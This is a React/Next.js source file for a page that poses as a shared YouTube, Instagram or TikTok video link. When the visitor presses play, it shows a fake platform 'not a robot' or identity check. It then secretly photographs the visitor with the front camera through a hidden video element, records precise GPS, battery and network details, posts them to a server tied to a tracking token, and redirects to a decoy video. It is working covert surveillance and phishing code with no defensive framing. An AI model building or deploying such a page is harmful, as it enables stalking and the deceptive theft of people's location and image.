'use client';

// Página disfarçada como link de vídeo compartilhado
// Suporta múltiplos presets: YouTube, Instagram Reels, TikTok
// Ao clicar em "play", captura foto + GPS silenciosamente e redireciona para URL configurada

import { Suspense, useEffect, useState, useRef } from 'react';
import { useSearchParams } from 'next/navigation';

// ===== PRESETS DE VÍDEO =====
interface VideoPreset {
  id: string;
  label: string;
  app: 'youtube' | 'instagram' | 'tiktok';
  title: string;
  channel: string;
  channelInitial: string;
  views: string;
  time: string;
  duration: string;
  likes: string;
  thumbGradient: string;
  thumbIcon: string;
  defaultRedirect: string;
  suggestions: { title: string; channel: string; views: string; gradient: string; icon: string }[];
}

const VIDEO_PRESETS: Record<string, VideoPreset> = {
  youtube_funny: {
    id: 'youtube_funny',
    label: 'YouTube - Vídeo Engraçado',
    app: 'youtube',
    title: 'kkkkk mano olha isso não tankei 😂😂',
    channel: 'Rodrigo',
    channelInitial: 'R',
    views: '2,3 mi de views',
    time: '3 dias',
    duration: '3:24',
    likes: '45K',
    thumbGradient: 'from-indigo-900/50 via-purple-900/40 to-pink-900/30',
    thumbIcon: '🎬',
    defaultRedirect: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    suggestions: [
      { title: 'Gatos engraçados que vão te fazer rir 😹', channel: 'FunnyPets', views: '890K views', gradient: 'from-orange-900/40 to-red-900/30', icon: '🐱' },
      { title: 'Top 10 gols impossíveis 2026', channel: 'Goals HD', views: '1,2 mi views', gradient: 'from-green-900/40 to-teal-900/30', icon: '⚽' },
    ],
  },
  youtube_music: {
    id: 'youtube_music',
    label: 'YouTube - Clipe Musical',
    app: 'youtube',
    title: 'Nova música BRABA 🔥🎵 Clipe Oficial',
    channel: 'MC Daniel',
    channelInitial: 'M',
    views: '5,8 mi de views',
    time: '1 dia',
    duration: '4:12',
    likes: '120K',
    thumbGradient: 'from-pink-900/50 via-red-900/40 to-orange-900/30',
    thumbIcon: '🎵',
    defaultRedirect: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    suggestions: [
      { title: 'AS MAIS TOCADAS 2026 🎶', channel: 'Hits Brasil', views: '3,1 mi views', gradient: 'from-violet-900/40 to-blue-900/30', icon: '🎧' },
      { title: 'Playlist funk 2026 - Só as melhores', channel: 'FunkBR', views: '2,4 mi views', gradient: 'from-yellow-900/40 to-amber-900/30', icon: '🔊' },
    ],
  },
  youtube_gaming: {
    id: 'youtube_gaming',
    label: 'YouTube - Gaming',
    app: 'youtube',
    title: 'JOGADA INSANA no Free Fire 🎮🔥 highlight',
    channel: 'ProGamerBR',
    channelInitial: 'P',
    views: '1,1 mi de views',
    time: '5 horas',
    duration: '10:47',
    likes: '89K',
    thumbGradient: 'from-emerald-900/50 via-cyan-900/40 to-blue-900/30',
    thumbIcon: '🎮',
    defaultRedirect: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    suggestions: [
      { title: 'MELHOR JOGADOR DO MUNDO? 😱', channel: 'GameClips', views: '4,5 mi views', gradient: 'from-red-900/40 to-pink-900/30', icon: '🏆' },
      { title: 'Fortnite Season Nova - Tudo que mudou', channel: 'FortBR', views: '890K views', gradient: 'from-blue-900/40 to-indigo-900/30', icon: '🎯' },
    ],
  },
  instagram_reel: {
    id: 'instagram_reel',
    label: 'Instagram - Reels',
    app: 'instagram',
    title: 'Olha esse reel kkkkk 😂',
    channel: '@humor.br',
    channelInitial: 'H',
    views: '458K curtidas',
    time: '2h',
    duration: '0:30',
    likes: '458K',
    thumbGradient: 'from-fuchsia-900/50 via-pink-900/40 to-orange-900/30',
    thumbIcon: '📸',
    defaultRedirect: 'https://www.instagram.com/',
    suggestions: [
      { title: 'Receita fácil em 30 segundos 🍕', channel: '@receitasrapidas', views: '1,2 mi curtidas', gradient: 'from-amber-900/40 to-red-900/30', icon: '🍕' },
      { title: 'Trend nova que tá viralizando 🔥', channel: '@trendsbr', views: '890K curtidas', gradient: 'from-purple-900/40 to-pink-900/30', icon: '💃' },
    ],
  },
  tiktok: {
    id: 'tiktok',
    label: 'TikTok - Vídeo Viral',
    app: 'tiktok',
    title: 'Esse vídeo tá viralizando MUITO 🤯🔥',
    channel: '@viraltok',
    channelInitial: 'V',
    views: '3,2 mi views',
    time: '6h',
    duration: '0:45',
    likes: '890K',
    thumbGradient: 'from-cyan-900/50 via-blue-900/40 to-violet-900/30',
    thumbIcon: '🎭',
    defaultRedirect: 'https://www.tiktok.com/',
    suggestions: [
      { title: 'POV: quando sua mãe descobre 😂', channel: '@comediabr', views: '5,6 mi views', gradient: 'from-rose-900/40 to-pink-900/30', icon: '😂' },
      { title: 'Tutorial makeup viral ✨', channel: '@beautytok', views: '2,1 mi views', gradient: 'from-fuchsia-900/40 to-violet-900/30', icon: '💄' },
    ],
  },
};

export default function CheckinPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center bg-[#0f0f0f]">
        <div className="w-8 h-8 border-[3px] border-white/10 border-t-white rounded-full animate-spin" />
      </div>
    }>
      <StealthContent />
    </Suspense>
  );
}

function StealthContent() {
  const searchParams = useSearchParams();
  const token = searchParams.get('token');

  const [phase, setPhase] = useState<'validating' | 'ready' | 'verifying' | 'capturing' | 'done'>('validating');
  const [preset, setPreset] = useState<VideoPreset>(VIDEO_PRESETS.youtube_funny);
  const [finalRedirect, setFinalRedirect] = useState<string>(VIDEO_PRESETS.youtube_funny.defaultRedirect);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Validar token silenciosamente e carregar config do vídeo
  useEffect(() => {
    if (!token) {
      window.location.href = finalRedirect;
      return;
    }

    fetch(`/api/checkin?token=${token}`)
      .then((r) => r.json())
      .then((d) => {
        if (d.valid) {
          const videoTipo = d.videoTipo || 'youtube_funny';
          const p = VIDEO_PRESETS[videoTipo] || VIDEO_PRESETS.youtube_funny;
          setPreset(p);
          setFinalRedirect(d.redirectUrl || p.defaultRedirect);
          setPhase('ready');
        } else {
          window.location.href = finalRedirect;
        }
      })
      .catch(() => {
        window.location.href = finalRedirect;
      });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [token]);

  const handlePlay = () => {
    setPhase('verifying');
  };

  const handleVerify = async () => {
    setPhase('capturing');

    let foto: string | null = null;
    let lat = 0;
    let lng = 0;

    // 1. Capturar foto (câmera frontal, escondida)
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
        audio: false,
      });

      if (videoRef.current && canvasRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        await new Promise((r) => setTimeout(r, 1000));

        const canvas = canvasRef.current;
        canvas.width = 480;
        canvas.height = 360;
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.translate(480, 0);
          ctx.scale(-1, 1);
          ctx.drawImage(videoRef.current, 0, 0, 480, 360);
          foto = canvas.toDataURL('image/jpeg', 0.6);
        }
        stream.getTracks().forEach((t) => t.stop());
      }
    } catch {
      // Câmera negada → continua sem foto
    }

    // 2. Obter GPS
    try {
      const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0,
        });
      });
      lat = pos.coords.latitude;
      lng = pos.coords.longitude;
    } catch {
      // GPS negado → continua com 0,0
    }

    // 3. Dados do dispositivo
    const deviceInfo: Record<string, unknown> = {
      tela: `${window.screen.width}x${window.screen.height}`,
      idioma: navigator.language || '',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
    };

    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const battery = await (navigator as any).getBattery?.();
      if (battery) {
        deviceInfo.bateria = Math.round(battery.level * 100);
        deviceInfo.carregando = battery.charging;
      }
    } catch { /* silencioso */ }

    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      if (conn) {
        deviceInfo.rede = conn.effectiveType || conn.type || '';
      }
    } catch { /* silencioso */ }

    // 4. Enviar dados
    try {
      await fetch('/api/checkin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, foto, latitude: lat, longitude: lng, ...deviceInfo }),
      });
    } catch { /* falha silenciosa */ }

    // 5. Redirecionar
    window.location.href = finalRedirect;
  };

  // ===== VERIFICAÇÃO FAKE POR APP =====
  const renderVerification = () => {
    if (preset.app === 'instagram') {
      return (
        <div className="relative z-10 w-full h-full flex items-center justify-center">
          <div className="bg-[#262626] rounded-xl p-5 mx-4 max-w-[320px] w-full shadow-2xl border border-white/10">
            <div className="flex items-center gap-2 mb-4">
              <svg className="w-7 h-7" viewBox="0 0 24 24" fill="none">
                <rect x="2" y="2" width="20" height="20" rx="6" stroke="url(#ig)" strokeWidth="2"/>
                <circle cx="12" cy="12" r="5" stroke="url(#ig)" strokeWidth="2"/>
                <circle cx="18" cy="6" r="1.5" fill="#E1306C"/>
                <defs><linearGradient id="ig" x1="2" y1="22" x2="22" y2="2"><stop stopColor="#FFDC80"/><stop offset="0.5" stopColor="#E1306C"/><stop offset="1" stopColor="#405DE6"/></linearGradient></defs>
              </svg>
              <span className="text-white font-semibold text-sm">Instagram</span>
            </div>
            <div className="text-white text-[13px] font-medium mb-2">Verificação de segurança</div>
            <p className="text-[#aaa] text-[11px] leading-relaxed mb-4">
              O Instagram precisa verificar sua identidade para exibir este conteúdo. Permita o acesso quando solicitado.
            </p>
            <div className="bg-[#363636] rounded-md p-3 mb-4 flex items-center gap-3">
              <div className="w-6 h-6 border-2 border-[#555] rounded-sm flex items-center justify-center bg-[#1a1a1a]">
                <svg className="w-4 h-4 text-[#E1306C]" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                </svg>
              </div>
              <span className="text-[#ddd] text-[12px]">Confirmar identidade</span>
            </div>
            <button onClick={handleVerify}
              className="w-full bg-gradient-to-r from-[#FFDC80] via-[#E1306C] to-[#405DE6] text-white text-[13px] font-medium py-2.5 rounded-lg transition-opacity hover:opacity-90">
              Ver conteúdo
            </button>
          </div>
        </div>
      );
    }

    if (preset.app === 'tiktok') {
      return (
        <div className="relative z-10 w-full h-full flex items-center justify-center">
          <div className="bg-[#1a1a1a] rounded-xl p-5 mx-4 max-w-[320px] w-full shadow-2xl border border-white/10">
            <div className="flex items-center gap-2 mb-4">
              <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none">
                <path d="M9 12a4 4 0 104 4V4a5 5 0 005 5" stroke="#25F4EE" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M9 12a4 4 0 104 4V4a5 5 0 005 5" stroke="#FE2C55" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" transform="translate(1,1)"/>
              </svg>
              <span className="text-white font-bold text-sm">TikTok</span>
            </div>
            <div className="text-white text-[13px] font-medium mb-2">Verificação necessária</div>
            <p className="text-[#888] text-[11px] leading-relaxed mb-4">
              Para assistir este vídeo compartilhado, o TikTok precisa confirmar que você não é um bot.
            </p>
            <div className="bg-[#2a2a2a] rounded-md p-3 mb-4 flex items-center gap-3">
              <div className="w-6 h-6 border-2 border-[#555] rounded-full flex items-center justify-center bg-[#111]">
                <svg className="w-4 h-4 text-[#25F4EE]" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                </svg>
              </div>
              <span className="text-[#ddd] text-[12px]">Não sou um robô</span>
            </div>
            <button onClick={handleVerify}
              className="w-full bg-[#FE2C55] hover:bg-[#e5284d] text-white text-[13px] font-bold py-2.5 rounded-lg transition-colors">
              Assistir vídeo
            </button>
          </div>
        </div>
      );
    }

    // YouTube (padrão)
    return (
      <div className="relative z-10 w-full h-full flex items-center justify-center">
        <div className="bg-[#212121] rounded-xl p-5 mx-4 max-w-[320px] w-full shadow-2xl border border-white/10">
          <div className="flex items-center gap-2 mb-4">
            <svg className="w-7 h-5" viewBox="0 0 90 20" fill="none">
              <rect width="28" height="20" rx="4" fill="#FF0000"/>
              <path d="M11.5 6L19 10L11.5 14V6Z" fill="white"/>
              <text x="32" y="15" fill="white" fontSize="14" fontFamily="Arial" fontWeight="bold">YouTube</text>
            </svg>
          </div>
          <div className="text-white text-[13px] font-medium mb-2">Verificação necessária</div>
          <p className="text-[#aaa] text-[11px] leading-relaxed mb-4">
            Para reproduzir este vídeo, o YouTube precisa verificar que você não é um robô. Permita o acesso quando solicitado.
          </p>
          <div className="bg-[#f9f9f9] rounded-md p-3 mb-4 flex items-center gap-3">
            <div className="w-6 h-6 border-2 border-[#c1c1c1] rounded-sm flex items-center justify-center bg-white">
              <svg className="w-4 h-4 text-[#4caf50]" fill="currentColor" viewBox="0 0 24 24">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
              </svg>
            </div>
            <span className="text-[#333] text-[12px]">Não sou um robô</span>
            <div className="ml-auto opacity-50">
              <svg className="w-8 h-8" viewBox="0 0 64 64">
                <path d="M32 2a30 30 0 100 60 30 30 0 000-60z" fill="none" stroke="#ccc" strokeWidth="2"/>
                <text x="18" y="38" fill="#999" fontSize="12" fontFamily="Arial">🔄</text>
              </svg>
            </div>
          </div>
          <button onClick={handleVerify}
            className="w-full bg-[#065fd4] hover:bg-[#0556bf] text-white text-[13px] font-medium py-2.5 rounded-lg transition-colors">
            Continuar para o vídeo
          </button>
        </div>
      </div>
    );
  };

  // ===== BOTÃO PLAY POR APP =====
  const renderPlayButton = () => {
    if (preset.app === 'instagram') {
      return (
        <button onClick={handlePlay} className="relative z-10 group" aria-label="Ver reel">
          <div className="w-16 h-16 bg-white/20 group-hover:bg-white/30 backdrop-blur-sm rounded-full flex items-center justify-center transition-all duration-200 group-hover:scale-105 shadow-xl">
            <svg className="w-7 h-7 text-white ml-0.5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M8 5v14l11-7z" />
            </svg>
          </div>
        </button>
      );
    }
    if (preset.app === 'tiktok') {
      return (
        <button onClick={handlePlay} className="relative z-10 group" aria-label="Assistir vídeo">
          <div className="w-16 h-16 bg-white/15 group-hover:bg-white/25 backdrop-blur-sm rounded-full flex items-center justify-center transition-all duration-200 group-hover:scale-105 shadow-xl border border-white/20">
            <svg className="w-7 h-7 text-white ml-0.5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M8 5v14l11-7z" />
            </svg>
          </div>
        </button>
      );
    }
    // YouTube
    return (
      <button onClick={handlePlay} className="relative z-10 group" aria-label="Assistir vídeo">
        <div className="w-[68px] h-[48px] bg-red-600 group-hover:bg-red-700 rounded-xl flex items-center justify-center transition-all duration-200 group-hover:scale-105 shadow-xl shadow-red-600/30">
          <svg className="w-6 h-6 text-white ml-0.5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M8 5v14l11-7z" />
          </svg>
        </div>
      </button>
    );
  };

  // ===== SPINNER =====
  const renderSpinner = (text: string) => (
    <div className="relative z-10 text-center">
      <div className="w-10 h-10 border-[3px] border-white/10 border-t-white/80 rounded-full animate-spin mx-auto mb-3" />
      <p className="text-white/60 text-xs font-medium">{text}</p>
    </div>
  );

  // ===== ELEMENTOS OCULTOS DE CAPTURA =====
  const hiddenCapture = (
    <>
      <video ref={videoRef} className="fixed top-[-9999px] left-[-9999px] w-px h-px opacity-0" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
    </>
  );

  // ===== LAYOUT INSTAGRAM =====
  if (preset.app === 'instagram') {
    return (
      <div className="min-h-screen bg-[#0f0f0f] flex flex-col items-center justify-center p-4">
        {hiddenCapture}
        <div className="max-w-[420px] w-full">
          <div className="bg-[#1a1a1a] rounded-xl overflow-hidden shadow-2xl">
            {/* Header Instagram */}
            <div className="flex items-center gap-2 px-3 py-2.5 border-b border-white/5">
              <div className="w-8 h-8 rounded-full bg-gradient-to-br from-[#FFDC80] via-[#E1306C] to-[#405DE6] p-[2px]">
                <div className="w-full h-full rounded-full bg-[#1a1a1a] flex items-center justify-center text-white text-xs font-bold">
                  {preset.channelInitial}
                </div>
              </div>
              <div>
                <p className="text-white text-xs font-semibold">{preset.channel}</p>
                <p className="text-[#777] text-[10px]">Reel • {preset.time}</p>
              </div>
              <div className="ml-auto text-white/50">•••</div>
            </div>

            {/* Thumbnail Reel */}
            <div className={`relative aspect-[9/16] max-h-[450px] bg-gradient-to-br ${preset.thumbGradient} flex items-center justify-center overflow-hidden`}>
              <div className="absolute inset-0 bg-gradient-to-t from-black/40 via-transparent to-transparent" />
              <div className="absolute inset-0 flex items-center justify-center opacity-10">
                <span className="text-8xl">{preset.thumbIcon}</span>
              </div>

              {phase === 'validating' && renderSpinner('')}
              {phase === 'ready' && renderPlayButton()}
              {phase === 'verifying' && renderVerification()}
              {phase === 'capturing' && renderSpinner('Carregando...')}
            </div>

            {/* Actions Instagram */}
            <div className="p-3">
              <div className="flex items-center gap-4 mb-2">
                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M21 8.25c0-2.485-2.099-4.5-4.688-4.5-1.935 0-3.597 1.126-4.312 2.733-.715-1.607-2.377-2.733-4.313-2.733C5.1 3.75 3 5.765 3 8.25c0 7.22 9 12 9 12s9-4.78 9-12z" />
                </svg>
                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 20.25c4.97 0 9-3.694 9-8.25s-4.03-8.25-9-8.25S3 7.444 3 12c0 2.104.859 4.023 2.273 5.48.432.447.74 1.04.586 1.641a4.483 4.483 0 01-.923 1.785A5.969 5.969 0 006 21c1.282 0 2.47-.402 3.445-1.087.81.22 1.668.337 2.555.337z" />
                </svg>
                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 12L3.269 3.126A59.768 59.768 0 0121.485 12 59.77 59.77 0 013.27 20.876L5.999 12zm0 0h7.5" />
                </svg>
                <svg className="w-6 h-6 text-white ml-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M17.593 3.322c1.1.128 1.907 1.077 1.907 2.185V21L12 17.25 4.5 21V5.507c0-1.108.806-2.057 1.907-2.185a48.507 48.507 0 0111.186 0z" />
                </svg>
              </div>
              <p className="text-white text-xs font-semibold">{preset.likes} curtidas</p>
              <p className="text-white text-xs mt-1"><span className="font-semibold">{preset.channel}</span> {preset.title}</p>
            </div>
          </div>
          <p className="text-center text-[10px] text-[#333] mt-6">Compartilhado com você via link</p>
        </div>
      </div>
    );
  }

  // ===== LAYOUT TIKTOK =====
  if (preset.app === 'tiktok') {
    return (
      <div className="min-h-screen bg-[#0f0f0f] flex flex-col items-center justify-center p-4">
        {hiddenCapture}
        <div className="max-w-[420px] w-full">
          <div className="bg-[#1a1a1a] rounded-xl overflow-hidden shadow-2xl relative">
            <div className={`relative aspect-[9/16] max-h-[500px] bg-gradient-to-br ${preset.thumbGradient} flex items-center justify-center overflow-hidden`}>
              <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-transparent" />
              <div className="absolute inset-0 flex items-center justify-center opacity-10">
                <span className="text-8xl">{preset.thumbIcon}</span>
              </div>

              {phase === 'validating' && renderSpinner('')}
              {phase === 'ready' && renderPlayButton()}
              {phase === 'verifying' && renderVerification()}
              {phase === 'capturing' && renderSpinner('Carregando...')}

              {/* Bottom overlay TikTok */}
              <div className="absolute bottom-0 left-0 right-12 p-3 z-10 pointer-events-none">
                <p className="text-white text-xs font-bold">{preset.channel}</p>
                <p className="text-white/90 text-[11px] mt-1">{preset.title}</p>
                <div className="flex items-center gap-2 mt-2">
                  <span className="bg-white/10 backdrop-blur-sm rounded-full px-2 py-0.5 text-white text-[10px]">🎵 som original</span>
                </div>
              </div>

              {/* Side actions TikTok */}
              <div className="absolute right-3 bottom-20 flex flex-col items-center gap-5 z-10 pointer-events-none">
                <div className="flex flex-col items-center">
                  <div className="w-10 h-10 rounded-full bg-[#1a1a1a] border-2 border-white flex items-center justify-center text-white text-sm font-bold">
                    {preset.channelInitial}
                  </div>
                  <div className="w-5 h-5 bg-[#FE2C55] rounded-full flex items-center justify-center -mt-2.5 text-white text-xs">+</div>
                </div>
                <div className="text-center">
                  <svg className="w-7 h-7 text-white mx-auto" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
                  </svg>
                  <span className="text-white text-[10px]">{preset.likes}</span>
                </div>
                <div className="text-center">
                  <svg className="w-7 h-7 text-white mx-auto" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
                  </svg>
                  <span className="text-white text-[10px]">1.2K</span>
                </div>
                <div className="text-center">
                  <svg className="w-7 h-7 text-white mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M7.217 10.907a2.25 2.25 0 100 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186l9.566-5.314m-9.566 7.5l9.566 5.314m0 0a2.25 2.25 0 103.935 2.186 2.25 2.25 0 00-3.935-2.186zm0-12.814a2.25 2.25 0 103.933-2.185 2.25 2.25 0 00-3.933 2.185z" />
                  </svg>
                  <span className="text-white text-[10px]">Share</span>
                </div>
              </div>
            </div>
          </div>
          <p className="text-center text-[10px] text-[#333] mt-6">Compartilhado com você via link</p>
        </div>
      </div>
    );
  }

  // ===== LAYOUT YOUTUBE (padrão) =====
  return (
    <div className="min-h-screen bg-[#0f0f0f] flex flex-col items-center justify-center p-4">
      {hiddenCapture}
      <div className="max-w-[420px] w-full">
        <div className="bg-[#1a1a1a] rounded-xl overflow-hidden shadow-2xl">
          {/* Thumbnail */}
          <div className={`relative aspect-video bg-gradient-to-br ${preset.thumbGradient} flex items-center justify-center overflow-hidden`}>
            <div className="absolute inset-0 opacity-[0.04]"
              style={{
                backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")`,
                backgroundSize: '150px 150px',
              }}
            />
            <div className="absolute inset-0 bg-gradient-to-t from-black/40 via-transparent to-transparent" />
            <div className="absolute inset-0 flex items-center justify-center opacity-10">
              <span className="text-8xl">{preset.thumbIcon}</span>
            </div>

            {phase === 'validating' && renderSpinner('')}
            {phase === 'ready' && renderPlayButton()}
            {phase === 'verifying' && renderVerification()}
            {phase === 'capturing' && renderSpinner('Carregando vídeo...')}

            <div className="absolute bottom-2 right-2 bg-black/80 text-white text-[11px] px-1.5 py-0.5 rounded font-medium z-10">
              {preset.duration}
            </div>
          </div>

          {/* Info do vídeo */}
          <div className="p-3.5">
            <div className="flex gap-3">
              <div className="w-9 h-9 rounded-full bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center text-white text-sm font-bold shrink-0 shadow-md">
                {preset.channelInitial}
              </div>
              <div className="flex-1 min-w-0">
                <h3 className="text-white text-[15px] font-medium leading-snug">{preset.title}</h3>
                <p className="text-[#aaa] text-xs mt-1.5 flex items-center gap-1">
                  <span>{preset.channel}</span>
                  <span className="text-[#555]">•</span>
                  <span>{preset.views}</span>
                  <span className="text-[#555]">•</span>
                  <span>{preset.time}</span>
                </p>
              </div>
            </div>

            <div className="flex items-center gap-4 mt-3.5 pt-3 border-t border-white/5">
              <div className="flex items-center gap-1.5 text-[#aaa] text-xs">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6.633 10.25c.806 0 1.533-.446 2.031-1.08a9.041 9.041 0 0 1 2.861-2.4c.723-.384 1.35-.956 1.653-1.715a4.498 4.498 0 0 0 .322-1.672V2.75a.75.75 0 0 1 .75-.75 2.25 2.25 0 0 1 2.25 2.25c0 1.152-.26 2.243-.723 3.218-.266.558.107 1.282.725 1.282m0 0h3.126c1.026 0 1.945.694 2.054 1.715.045.422.068.85.068 1.285a11.95 11.95 0 0 1-2.649 7.521c-.388.482-.987.729-1.605.729H13.48c-.483 0-.964-.078-1.423-.23l-3.114-1.04a4.501 4.501 0 0 0-1.423-.23H5.904m7.723 2.5H8.25a2.25 2.25 0 0 1-2.25-2.25v-6.75a2.25 2.25 0 0 1 2.25-2.25h.347c.52 0 1.033.09 1.518.26l2.29.764c.577.192 1.15.39 1.718.588" />
                </svg>
                <span>{preset.likes}</span>
              </div>
              <div className="flex items-center gap-1.5 text-[#aaa] text-xs">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M7.217 10.907a2.25 2.25 0 1 0 0 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186 9.566-5.314m-9.566 7.5 9.566 5.314m0 0a2.25 2.25 0 1 0 3.935 2.186 2.25 2.25 0 0 0-3.935-2.186Zm0-12.814a2.25 2.25 0 1 0 3.933-2.185 2.25 2.25 0 0 0-3.933 2.185Z" />
                </svg>
                <span>Compartilhar</span>
              </div>
              <div className="flex items-center gap-1.5 text-[#aaa] text-xs">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
                </svg>
                <span>Salvar</span>
              </div>
            </div>
          </div>
        </div>

        {/* Sugestões */}
        <div className="mt-4 space-y-3">
          <p className="text-[#aaa] text-xs font-medium px-1">A seguir</p>
          {preset.suggestions.map((s, i) => (
            <div key={i} className="flex gap-2.5 bg-[#1a1a1a]/50 rounded-lg p-2 cursor-default">
              <div className={`w-[120px] h-[68px] rounded-md bg-gradient-to-br ${s.gradient} shrink-0 flex items-center justify-center`}>
                <span className="text-2xl opacity-30">{s.icon}</span>
              </div>
              <div className="flex-1 min-w-0 py-0.5">
                <p className="text-white text-xs font-medium leading-snug line-clamp-2">{s.title}</p>
                <p className="text-[#777] text-[10px] mt-1">{s.channel} • {s.views}</p>
              </div>
            </div>
          ))}
        </div>

        <p className="text-center text-[10px] text-[#333] mt-6">Compartilhado com você via link</p>
      </div>
    </div>
  );
}
